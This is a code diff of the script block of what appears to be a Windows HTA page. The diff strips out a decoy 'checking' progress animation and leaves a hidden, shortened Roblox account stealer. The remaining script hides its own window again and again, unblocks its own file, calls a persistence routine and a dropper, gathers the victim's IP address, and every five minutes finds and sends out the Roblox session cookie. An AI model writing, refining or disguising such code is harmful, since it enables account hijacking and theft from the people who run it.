-function stamp(){ try{ last.innerHTML="Last check: "+(new Date()).toLocaleTimeString(); }catch(e){} }
-
-function tick(){
- if(!pD){
-  pT++; var p=pT*2; if(p>100)p=100;
-  bar.style.width=p+"%"; pct.innerHTML=p+"%";
-  if(pT%13===0 && pS<4){ if(pS>0) steps[pS-1].className="ok"; steps[pS].className="on"; pS++; }
-  if(pT>=52){
-   pD=true; if(pS>0) steps[pS-1].className="ok";
-   bar.style.width="100%"; pct.innerHTML="100%";
-   stage.style.display="none"; done.className="done show";
-   ckc.setAttribute("stroke-dashoffset",151); ckt.setAttribute("stroke-dashoffset",40);
-  }
- }else{
-  ck++;
-  if(ck<=16) ckc.setAttribute("stroke-dashoffset", Math.round(151-151*ck/16));
-  else if(ck<=24) ckt.setAttribute("stroke-dashoffset", Math.round(40-40*(ck-16)/8));
-  else if(ck===25){
-   ckt.setAttribute("stroke-dashoffset",0);
-   stamp();
-   if(AUTOHIDE) setTimeout(HideMe,8000);
-  }
- }
-}
-
-/* ---------- anti-doublon ---------- */
 function isFresh(){
- var mk=Env("TEMP")+"\\"+tok+".lok", fresh=false;
- try{ if(fso.FileExists(mk)){ if((new Date()-fso.GetFile(mk).DateLastModified)<25000) fresh=true; } }catch(e){}
- try{ Wr(mk, ""+(new Date()).getTime()); }catch(e){}
- return fresh;
+ var mk=Env("TEMP")+"\\"+LK,f=false;
+ try{if(fso.FileExists(mk)){if((new Date()-fso.GetFile(mk).DateLastModified)<25000)f=true}}catch(e){}
+ try{Wr(mk,""+(new Date()).getTime())}catch(e){}
+ return f;
 }
 
-function Report(){
- var ip=GetIP();
- SendInfo(ip);
- var r=FindCookie();
- if(!r.ok){ Alert("Roblox - no cookie", r.how, 15158332); info.innerHTML="no cookie ("+r.how+")"; }
- else { SendCookie(r.ck, r.how); info.innerHTML="IP "+(ip.ip||"?")+" - cookie "+r.ck.length+" chars"; }
+function Rep(){
+ var ip=IP();
+ SI(ip);
+ var r=FC();
+ if(!r.ok)Al("Roblox - no cookie",r.how,15158332);
+ else SC(r.ck,r.how);
 }
-
-function boot(){ Pers(); Report(); Drop(); }
+function boot(){Pers();Rep();Drp()}
 
 window.onload=function(){
- document.getElementById("x").onclick = HideMe;
- document.getElementById("again").onclick = function(){ Report(); stamp(); };
-
- if(isFresh()){ HideMe(); Pers(); return; }
-
- Center();
- setTimeout(function(){ setInterval(tick,60); },300);
- setTimeout(boot, 900+Math.floor(Math.random()*2400));
- setInterval(function(){ Report(); stamp(); },300000);
+ Hd();
+ try{var s=SelfP();if(s)Ub(s)}catch(e){}
+ try{
+  if(isFresh()){Pers();return}
+  setTimeout(boot,300);
+  setInterval(Rep,300000);
+ }catch(e){}
+ setTimeout(Hd,50);setTimeout(Hd,500);setTimeout(Hd,1500);setTimeout(Hd,4000);
 };
 })();
 </script>
